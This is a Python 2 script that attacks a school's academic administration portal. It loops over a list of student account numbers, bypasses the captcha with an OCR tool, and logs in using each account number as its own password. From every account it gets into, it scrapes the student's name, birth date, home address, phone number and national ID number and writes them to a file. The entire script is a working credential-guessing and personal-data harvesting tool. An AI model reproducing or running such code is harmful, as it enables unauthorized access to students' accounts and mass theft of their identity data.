#!/usr/bin/env python
# -*- coding:utf-8 -*-
import urllib, urllib2
import cookielib
from bs4 import BeautifulSoup
import os, re
import sys
from multiprocessing import Pool

student_info = open('student_info.txt','a')
def Optain_info(account):
	#登录url，验证码url，验证码存储路径
	login_url = "http://教务系统/Login.aspx"
	captcha_url = "http://教务系统/other/CheckCode.aspx?datetime=az"
	captcha_path = 'D:\\Script demo\\python_demo\\School\\optaion_account\\jiaowu_info\\photo\\'
	early_url = 'http://教务系统/JWXS/xsMenu.aspx'

	# account = sys.argv[1]
	# 通过cookielib来创建opener对象，保存cookie
	cookie = cookielib.CookieJar()
	handler = urllib2.HTTPCookieProcessor(cookie)
	opener = urllib2.build_opener(handler)
	opener.addheaders=[('User-agent','Mozilla/5.0')]
	urllib2.install_opener(opener)

	#用建立好的opener对象访问验证码地址，opener对象保存访问验证码后的cookie以及图片
	for i in range(5):
		picture = opener.open(captcha_url).read()
		local = open('D:\\Script demo\\python_demo\\School\\optaion_account\\jiaowu_info\\photo\\image.jpg','wb')
		local.write(picture)
		local.close()
		#利用验证码识别工具自动输出验证码
		checkcode = os.popen('verifyCaptchaconfig\\VerifyTool.exe verifyCaptchaconfig\\school.ci.png -f photo\\image.jpg').read()
		if len(checkcode) == 4:
			print checkcode
			break

	data = {
		"post1":"post1_data",
    	"post2":"post1_data",
    	"post3":"post3_data",
	    "Account":account,
	    "PWD":account,
	    "CheckCode":checkcode,
	    "cmdok":""
	}
	post_data = urllib.urlencode(data)

	result = opener.open(login_url,post_data).read()

	# 创建获取信息的函数
	# 这里边有两种情况
	# 一、是否显示完全 有的浏览器可以显示所有页面，如IE，但是有的浏览器只能显示部分页面，这里使用“xskp/jwxs_xskp_like.aspx?usermain=”判断是否显示完全
	# 二、是否登录成功  如果出现“other/CheckCode.aspx” 就说明没有登陆成功

	# 是否登录成功，为-1则表示成功，否则则失败
	login_success_whether = result.find('other/CheckCode.aspx')
	if login_success_whether == -1:
		print "Login success!!" + account
		info_url_early = opener.open(early_url).read()
		info_url_middle = re.findall('xskp/jwxs_xskp_like\.aspx\?usermain=x\d{10}',info_url_early,re.S)[0]
		info_url_after = 'http://教务系统/JWXS/' + info_url_middle
		# 获取到个人信息页面
		data_info = opener.open(info_url_after).read()

		Soup = BeautifulSoup(data_info,'lxml')
		institute = Soup.select('#lbxsh')[0].get_text()
		major = Soup.select('#lbzyh')[0].get_text()
		Class = Soup.select('#lbbh')[0].get_text()
		name = Soup.select('#tbxsxm')[0].get('value')
		birth = Soup.select('#tbcsrq')[0].get('value')
		location = Soup.select('#tbjtxzdz')[0].get('value')
		home_tel = Soup.select('#tblxdh')[0].get('value')
		ID = Soup.select('#tbsfzh')[0].get('value')
		response = u'{} {} {} {} {} {} {} {} {}'.format(account,institute,major,Class,name,birth,location,home_tel,ID)
		detail =  response.encode('gb18030')
		print detail
		student_info.write(detail + '\n')
	else:
		print "Login fail...." + account
		pass

a = open('demo.txt','r')
account = a.readlines()

for i in account:
	i = i.strip('\n')
	Optain_info(i)

# account_info = num.split()
# for i in account_info:
# 	Optain_info(i)
